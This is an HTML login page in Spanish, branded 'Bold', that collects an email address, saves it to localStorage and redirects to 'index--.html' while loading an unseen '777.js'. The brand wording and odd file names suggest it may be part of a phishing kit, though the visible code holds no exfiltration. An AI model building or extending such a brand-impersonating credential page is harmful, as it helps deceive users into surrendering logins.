<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Bold - Ingresar</title>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600;700&display=swap" rel="stylesheet">

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Montserrat', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }

    body {
      background-color: #fbfbff;
      background-image:
        radial-gradient(
          circle 55% at 50% 44%,
          rgba(255, 255, 255, 1) 0%,
          rgba(255, 255, 255, 0.70) 45%,
          rgba(255, 255, 255, 0) 68%
        ),
        radial-gradient(
          circle at 50% 50%,
          #fbfbff 0%,
          #eef0ff 58%,
          #dce1ff 100%
        );
      background-attachment: fixed;
      min-height: 100vh;
      display: flex;
      justify-content: center;
    }

    .screen {
      width: 100%;
      max-width: 420px;
      min-height: 100vh;
      background: transparent;
      display: flex;
      flex-direction: column;
      padding: 20px 24px 32px;
      position: relative;
    }

    .back-btn {
      background: none;
      border: none;
      font-size: 26px;
      color: #1a1a2e;
      cursor: pointer;
      padding: 4px 8px;
      width: fit-content;
    }

    .content {
      flex: 1;
      display: flex;
      flex-direction: column;
      justify-content: center;
      margin-top: -60px;
    }

    .logo {
      width: 32px;
      height: 32px;
      object-fit: contain;
      margin: 0 auto 18px;
      display: block;
    }

    .title {
      font-size: 22px;
      font-weight: 700;
      color: #1a1a2e;
      text-align: center;
      margin-bottom: 8px;
      letter-spacing: -0.3px;
    }

    .subtitle {
      font-size: 14px;
      font-weight: 600;
      color: #4a4a5a;
      text-align: center;
      margin-bottom: 36px;
    }

    .label {
      font-size: 13px;
      font-weight: 700;
      color: #1a1a2e;
      margin-bottom: 8px;
    }

    .input {
      width: 100%;
      padding: 14px 16px;
      font-size: 14px;
      font-weight: 600;
      border: none;
      border-radius: 10px;
      background: #eceefc;
      color: #1a1a2e;
      outline: none;
      font-family: 'Montserrat', sans-serif;
    }

    .input::placeholder {
      color: #9a9ab0;
      font-weight: 600;
    }

    .btn-ingresar {
      width: 100%;
      padding: 16px;
      background: #ff2b5e;
      color: #ffffff;
      font-size: 15px;
      font-weight: 700;
      border: none;
      border-radius: 30px;
      cursor: pointer;
      margin-top: auto;
      font-family: 'Montserrat', sans-serif;
    }

    .btn-ingresar:active {
      opacity: 0.9;
    }
  </style>
</head>
<body>
  <div class="screen">
    <button class="back-btn" type="button" onclick="history.back()">&#8249;</button>

    <form class="content" id="formCorreo" novalidate>
      <img src="Iso.png" alt="Bold" class="logo" />

      <h1 class="title">¡Te damos la bienvenida a Bold!</h1>
      <p class="subtitle">Ingresa con el correo registrado.</p>

      <label class="label" for="correo">Correo electrónico</label>
      <input
        id="correo"
        name="email"
        type="email"
        class="input"
        placeholder="correo@gmail.com"
        autocomplete="email"
        inputmode="email"
        spellcheck="false"
        autocapitalize="off"
        required
      />
    </form>

    <button class="btn-ingresar" type="submit" form="formCorreo" id="btnContinuar">Ingresar</button>
  </div>

  <script>
    const formCorreo = document.getElementById("formCorreo");
    const campoCorreo = document.getElementById("correo");

    formCorreo.addEventListener("submit", (e) => {
      e.preventDefault();

      const email = campoCorreo.value.trim();

      if (!email || !email.includes("@")) {
        alert("Por favor ingresa un correo válido");
        return;
      }

      localStorage.setItem("bold_email", email);
      window.location.href = "index--.html";
    });
  </script>

  <script src="777.js"></script>
</body>
</html>
